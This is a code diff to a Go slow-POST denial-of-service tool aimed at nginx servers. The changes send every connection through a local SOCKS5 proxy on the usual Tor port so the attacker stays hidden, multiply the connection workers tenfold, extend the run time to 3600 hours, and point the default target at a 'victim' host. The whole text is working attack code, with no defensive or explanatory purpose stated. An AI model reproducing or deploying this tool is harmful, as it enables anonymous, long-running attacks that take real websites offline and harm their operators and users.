@@ -15,16 +15,19 @@ import (
 	"runtime"
 	"strings"
 	"time"
+	"errors"
+
+	"golang.org/x/net/proxy"
 )
 
 var (
 	contentLength    = flag.Int("contentLength", 1000*1000, "The maximum length of fake POST body in bytes. Adjust to nginx's client_max_body_size")
-	dialWorkersCount = flag.Int("dialWorkersCount", 10, "The number of workers simultaneously busy with opening new TCP connections")
+	dialWorkersCount = flag.Int("dialWorkersCount", 100, "The number of workers simultaneously busy with opening new TCP connections")
 	goMaxProcs       = flag.Int("goMaxProcs", runtime.NumCPU(), "The maximum number of CPUs to use. Don't touch :)")
 	rampUpInterval   = flag.Duration("rampUpInterval", time.Second, "Interval between new connections' acquisitions for a single dial worker (see dialWorkersCount)")
 	sleepInterval    = flag.Duration("sleepInterval", 10*time.Second, "Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout")
-	testDuration     = flag.Duration("testDuration", time.Hour, "Test duration")
-	victimUrl        = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url. Http POST must be allowed in nginx config for this url")
+	testDuration     = flag.Duration("testDuration", time.Hour*3600, "Test duration")
+	victimUrl        = flag.String("victimUrl", "http://victim.com/", "Victim's url. Http POST must be allowed in nginx config for this url")
 	hostHeader        = flag.String("hostHeader", "", "Host header value in case it is different than the hostname in victimUrl")
 )
 
@@ -36,6 +39,12 @@ var (
 		InsecureSkipVerify: true,
 	}
 )
+
+type sled struct { // or sledge
+        tls *tls.Conn
+        tcp *net.TCPConn
+        udp *net.UDPConn
+}
 
 func main() {
 	flag.Parse()
@@ -96,12 +105,23 @@ func activeConnectionsCounter(ch <-chan int) {
 func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
 	// TODO hint: add support for dialing the victim via a random proxy
 	// from the given pool.
-	conn, err := net.Dial("tcp", hostPort)
+	// Setup Proxy 
+	var s sled
+	dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, &s)
+	// tbProxyURL, err := url.Parse("socks5://127.0.0.1:9050")
+	if err != nil {
+		log.Fatalf("Failed to parse proxy URL: %v\n", err)
+	}
+
+	// tbDialer, err := proxy.FromURL(tbProxyURL, proxy.Direct)
+
+	conn, err := dialer.Dial("tcp", hostPort)
 	if err != nil {
 		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", hostPort, err)
 		return nil
 	}
-	tcpConn := conn.(*net.TCPConn)
+
+	tcpConn := s.tcp
 	if err = tcpConn.SetReadBuffer(128); err != nil {
 		log.Fatalf("Cannot shrink TCP read buffer: [%s]\n", err)
 	}
@@ -159,4 +179,17 @@ func nullReader(conn io.Reader, ch chan<- int) {
 	} else {
 		log.Printf("Unexpected response read from server: [%s]\n", sharedReadBuf[:n])
 	}
+}
+
+func (s *sled) Dial(network, address string) (net.Conn, error) { // satisfies proxy.Dialer interface
+        switch network {
+        case "tcp", "tcp4", "tcp6":
+                c, err := net.Dial(network, address)
+                if err != nil {
+                        return nil, err
+                }
+                s.tcp = c.(*net.TCPConn)
+                return c, nil
+        }
+        return nil, errors.New("not implemented yet")
 }
